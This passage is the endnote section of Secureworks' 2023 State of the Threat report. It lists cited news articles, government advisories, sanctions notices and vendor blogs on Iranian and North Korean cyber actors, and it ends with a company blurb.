north\-korea\-s\-lazarus\-group\-turns\-to\-supply\-chain\-attacks, 
10/26/21\.

ChatGPT just created malware, and that's seriously 
scary, https://www.digitaltrends.com/computing/chatgpt\-
created\-malware/, 4/7/23\.

CISA, NSA, FBI, and International Partners Release Joint 
CSA on Top Routinely Exploited Vulnerabilities of 2022, 
https://www.cisa.gov/news\-events/alerts/2023/08/03/cisa\-
nsa\-fbi\-and\-international\-partners\-release\-joint\-csa\-top\-
routinely\-exploited\-vulnerabilities, 8/3/23\.

77 

Guildma is now abusing colorcpl.exe LOLBIN, https://isc.
sans.edu/diary/rss/29814, 5/5/23\.

42 

43 

44 

45 

46 

47 

48 

49 

50 

51 

52 

53 

54 

55 

OPSEC MISTAKES REVEAL COBALT MIRAGE THREAT 
ACTORS, https://www.secureworks.com/blog/opsec\-
mistakes\-reveal\-cobalt\-mirage\-threat\-actors, 9/14/22\.

Iran's Widening Crackdown Pressures Rouhani, https://
www.washingtoninstitute.org/policy\-analysis/irans\-
widening\-crackdown\-pressures\-rouhani, 11/25/15\.

Seven Iranians Working for Islamic Revolutionary Guard 
Corps\-Affiliated Entities Charged for Conducting 
Coordinated Campaign of Cyber Attacks Against 
U.S. Financial Sector, https://www.justice.gov/opa/pr/
seven\-iranians\-working\-islamic\-revolutionary\-guard\-corps\-
affiliated\-entities\-charged, 3/24/16\.

Treasury Sanctions Iranian Organizations and Individuals 
Supporting Intelligence and Cyber Targeting of U.S. 
Persons, https://home.treasury.gov/news/press\-releases/
sm611, 2/13/19\.

Treasury Sanctions Cyber Actors Backed by Iranian 
Intelligence Ministry, https://home.treasury.gov/news/
press\-releases/sm1127, 9/17/20\.

Treasury Sanctions Iranian Officials and Entities 
Responsible for Ongoing Crackdown on Protests and 
Internet Censorship, https://home.treasury.gov/news/
press\-releases/jy1048, 10/26/22\.

Iranian intel cyber suite of malware uses open 
source tools, https://www.cybercom.mil/Media/News/
Article/2897570/iranian\-intel\-cyber\-suite\-of\-malware\-uses\-
open\-source\-tools/, 1/12/22\.

Acting Manhattan U.S. Attorney Announces Charges 
Against Iranian National For Conducting Cyber Attack 
And $6 Million Extortion Scheme Against HBO, https://
www.justice.gov/usao\-sdny/pr/acting\-manhattan\-us\-
attorney\-announces\-charges\-against\-iranian\-national\-
conducting, 11/21/17\.

MOST WANTED: BEHZAD MESRI, https://www.fbi.gov/
wanted/cyber/copy\_of\_behzad\-mesri, 2/13/19\.

Treasury Sanctions Iranian Organizations and Individuals 
Supporting Intelligence and Cyber Targeting of U.S. 
Persons, https://home.treasury.gov/news/press\-releases/
sm611, 2/13/19\.

Emennet Pasargad, https://rewardsforjustice.net/rewards/
emennet\-pasargad/, undated.

Charming Kitten: “Can We Have A Meeting?”, https://
blog.certfa.com/posts/charming\-kitten\-can\-we\-wave\-a\-
meeting/, 9/8/22\.

COBALT ILLUSION MASQUERADES AS ATLANTIC 
COUNCIL EMPLOYEE, https://www.secureworks.com/blog/
cobalt\-illusion\-masquerades\-as\-atlantic\-council\-employee, 
3/9/23\.

2021 STATE OF THE THREAT REPORT, https://www.
secureworks.com/resources/rp\-state\-of\-the\-threat\-2021, 
9/21\.

56 

57 

58 

59 

60 

61 

62 

63 

64 

65 

66 

67 

68 

69 

70 

ABRAHAM'S AX LIKELY LINKED TO MOSES STAFF, 
https://www.secureworks.com/blog/abrahams\-ax\-likely\-
linked\-to\-moses\-staff, 1/26/23\.

Treasury Sanctions Iran Cyber Actors for Attempting 
to Influence the 2020 U.S. Presidential Election, https://
home.treasury.gov/news/press\-releases/jy0494, 11/18/21\.

Predatory Sparrow: Who are the hackers who say they 
started a fire in Iran? https://www.bbc.co.uk/news/
technology\-62072480, 7/11/22\.

Predatory Sparrow operation against Iranian steel maker 
(2022\), https://cyberlaw.ccdcoe.org/wiki/Predatory\_
Sparrow\_operation\_against\_Iranian\_steel\_maker\_(2022\), 
8/17/22\.

Treasury Sanctions Iranian Ministry of Intelligence 
and Minister for Malign Cyber Activities, https://home.
treasury.gov/news/press\-releases/jy0941, 9/9/22\.

Cybercriminals attempt to attack Ukrainian governmental 
agencies with fake OS updates, https://cip.gov.ua/
en/news/kiberzlovmisniki\-namagayutsya\-atakuvati\-
derzhorgani\-ukrayini\-feikovimi\-onovlennyami\-operaciinoyi\-
sistemi, 4/29/23\.

AppleJeus: Analysis of North Korea's Cryptocurrency 
Malware, https://www.cisa.gov/news\-events/cybersecurity\-
advisories/aa21\-048a, 4/15/21\.

North Korean crypto thefts target Japan, Vietnam, Hong 
Kong, https://asia.nikkei.com/Spotlight/Cryptocurrencies/
North\-Korean\-crypto\-thefts\-target\-Japan\-Vietnam\-Hong\-
Kong, 5/15/23\.

North Korea Exports, https://tradingeconomics.com/north\-
korea/exports, accessed 8/18/23\.

Operation AppleJeus: Lazarus hits cryptocurrency 
exchange with fake installer and macOS malware, https://
securelist.com/operation\-applejeus/87553/, 8/23/18\.

BlueNoroff APT group targets macOS with “RustBucket” 
Malware, https://www.jamf.com/blog/bluenoroff\-apt\-
targets\-macos\-rustbucket\-malware, 4/21/23\.

I see what you did there: A look at the CloudMensis 
macOS spyware, https://www.welivesecurity.
com/2022/07/19/i\-see\-what\-you\-did\-there\-look\-
cloudmensis\-macos\-spyware/, 7/19/22\.

TraderTraitor: North Korean State\-Sponsored APT Targets 
Blockchain Companies, https://www.cisa.gov/news\-events/
cybersecurity\-advisories/aa22\-108a, 4/20/22\.

Linux malware strengthens links between Lazarus and 
the 3CX supply\-chain attack, https://www.welivesecurity.
com/2023/04/20/linux\-malware\-strengthens\-links\-lazarus\-
3cx\-supply\-chain\-attack, 4/20/23\.

Kimsuky \| Ongoing Campaign Using Tailored 
Reconnaissance Toolkit, https://www.sentinelone.
com/labs/kimsuky\-ongoing\-campaign\-using\-tailored\-
reconnaissance\-toolkit/, 5/23/23\.

2023 State of the Threat: A Year in Review

74

ABOUT SECUREWORKS

Secureworks® (NASDAQ: SCWX) is a global cybersecurity leader that protects customer 

progress with Secureworks® Taegis™, a cloud\-native security analytics platform built on 

20\+ years of real\-world threat intelligence and research, improving customers' ability to 

detect advanced threats, streamline and collaborate on investigations, and automate 

the right actions.

For more information, call 1\-877\-838\-7947 to speak to a 

Secureworks security specialist or visit secureworks.com

Availability varies by region. ©2023 SecureWorks, Inc. All rights reserved.

2023 State of the Threat: A Year in Review

75